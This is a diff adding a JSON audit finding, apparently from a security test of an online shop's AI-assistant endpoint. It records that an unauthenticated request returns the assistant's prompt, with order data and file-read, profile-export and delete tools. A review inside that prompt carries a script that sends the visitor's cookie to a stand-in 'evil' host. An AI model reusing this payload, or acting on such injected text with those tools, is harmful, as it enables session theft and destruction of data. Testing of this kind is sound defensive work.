@@ -1,0 +1,10 @@
+{
+  "name": "09_assistant_context_open",
+  "title": "Контекст помощника без авторизации",
+  "request": "GET /assistant/context?order_id=1 (без токена)",
+  "status": 200,
+  "response": {
+    "prompt": "Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\nПомоги пользователю обработать заказ.\nЗаказ: [{\"id\": 1, \"owner\": 1, \"product\": \"chair\", \"price\": 5000.0}]\nОтзывы: [{\"product\": \"chair\", \"text\": \"<script>document.location='http://evil/'+document.cookie</script>\"}]\nЗапрос пользователя: Покажи чек"
+  },
+  "verdict": "Контекст с данными заказа и инструментами export/delete выдан без входа"
+}
